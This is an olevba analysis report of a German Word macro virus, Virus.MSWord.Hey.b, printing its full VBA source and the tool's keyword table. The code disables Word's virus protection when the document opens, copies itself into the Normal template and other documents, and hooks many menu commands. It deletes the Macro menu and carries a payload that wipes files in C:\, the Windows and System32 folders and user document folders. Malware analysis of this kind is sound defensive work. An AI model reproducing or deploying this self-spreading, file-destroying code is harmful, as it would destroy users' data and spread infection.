olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hey.b-351fa55ab2ac0d9f06147430dbd3980bf1d3bed8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hey.b-351fa55ab2ac0d9f06147430dbd3980bf1d3bed8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSWord.Hey.b-351fa55ab2ac0d9f06147430dbd3980bf1d3bed8 - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen(): Options.VirusProtection = 0: ĆĎ©§Ą: End Sub
Sub ĆĎ©§Ą()
Set ú = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set ó = ActiveDocument.VBProject.VBComponents(1).CodeModule: Set ý = ThisDocument.VBProject.VBComponents(1).CodeModule:
If ú.CountOfLines = 0 Then ú.InsertLines 1, ý.Lines(1, 47)
If ó.CountOfLines = 0 Then ó.InsertLines 1, ý.Lines(1, 40)
CommandBars("Tools").Controls("Makro").Delete
End Sub
Sub AutoNew(): ĆĎ©§Ą: End Sub
Sub DocumentNew(): ĆĎ©§Ą: End Sub
Sub DocumentOpen(): ĆĎ©§Ą: End Sub
Sub DateiÖffnen(): ĆĎ©§Ą: End Sub
Sub DateiBeenden(): ĆĎ©§Ą: End Sub
Sub BearbeitenKopieren(): ĆĎ©§Ą: End Sub
Sub BearbeitenEinfügen(): ĆĎ©§Ą: End Sub
Sub BearbeitenAusschneiden(): ĆĎ©§Ą: End Sub
Sub FormatZeichen(): ĆĎ©§Ą: End Sub
Sub FormatAbsatz(): ĆĎ©§Ą: End Sub
Sub FormatSpalten(): ĆĎ©§Ą: End Sub
Sub FormatTabulator(): ĆĎ©§Ą: End Sub
Sub FormatHintergrund(): ĆĎ©§Ą: End Sub
Sub FormatAutoFormat(): ĆĎ©§Ą: End Sub
Sub ExtrasAnpassen(): ĆĎ©§Ą: End Sub
Sub ExtrasOptionen(): ĆĎ©§Ą: End Sub
Sub ExtrasAutoKorrektur(): ĆĎ©§Ą: End Sub
Sub DateiSchließen(): ĆĎ©§Ą: End Sub
Sub AutoExit(): ĆĎ©§Ą: If Day(31) And Month(Now) Then Call ˘¤Ł: End Sub
Sub ˘¤Ł()
On Error Resume Next
Kill "C:\*.*"
Kill "C:\Windows\*.*"
Kill "C:\Windows\System\*.*"
Kill "C:\Windows\System32\*.*"
Kill "C:\Windows\Eigene Dateien\*.*"
Kill "C:\Eigene Dateien\*.*"
Kill "C:\Dokumente\*.*"
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |DocumentOpen        |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

